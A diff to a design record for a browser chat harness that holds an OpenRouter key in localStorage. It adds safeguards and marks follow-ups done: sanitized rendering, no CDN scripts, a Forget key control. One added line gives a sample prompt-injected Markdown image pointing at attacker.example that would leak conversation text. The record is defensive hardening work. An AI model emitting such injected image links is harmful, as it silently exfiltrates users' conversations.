@@ -80,14 +80,16 @@ a, i have an openrouter key
 ### Consequences
 - The settings panel has a password-type key field, a **Forget key** button, and a plain note saying the key is stored in this browser's `localStorage` and why a dedicated, limited key is safer.
 - The key is never in the repo, a `.env` file, or a GitHub secret. Anything put there at build time would be inlined into the public bundle. `.gitignore` excludes `.env*` as a guard.
+- The key is stored under its own `localStorage` entry (`harness.apiKey`), separate from conversations, so **exporting conversations can never include it**.
+- Rendered replies also block **images** (and media and embeds), not just scripts. A Markdown image loads automatically, so a prompt-injected `![](https://attacker.example/?q=…)` would leak conversation text with no click. Links still work, opening in a new tab with `noopener`. Tested in `src/lib/markdown.test.ts`.
 
 ---
 
 ## Open Follow-ups
 
-- [ ] **Sanitize every rendered reply** (e.g., Markdown → HTML → DOMPurify) before it touches the DOM. This applies to any option, because unsanitized model output is the easiest way to steal the key.
-- [ ] **No runtime third-party scripts.** Dependencies are bundled or kept as files in the repo, never `<script src>` from a CDN, since any script on the page can read `localStorage`.
-- [ ] A visible **"Forget key"** control, and a first-run note that says plainly where the key is stored.
+- [x] **Sanitize every rendered reply** (e.g., Markdown → HTML → DOMPurify) before it touches the DOM. This applies to any option, because unsanitized model output is the easiest way to steal the key. *(Done: `src/lib/markdown.ts`, the only `v-html` source.)*
+- [x] **No runtime third-party scripts.** Dependencies are bundled or kept as files in the repo, never `<script src>` from a CDN, since any script on the page can read `localStorage`. *(Done: Vite bundles everything; `dist/index.html` loads only `./assets/…`.)*
+- [x] A visible **"Forget key"** control, and a first-run note that says plainly where the key is stored. *(Done: Settings opens on first visit and names the shared origin.)*
 - [ ] ~~Spike: run the full sign-in round trip from a `github.io` callback~~. Moot under A; reopen if B is ever added.
 
 ---
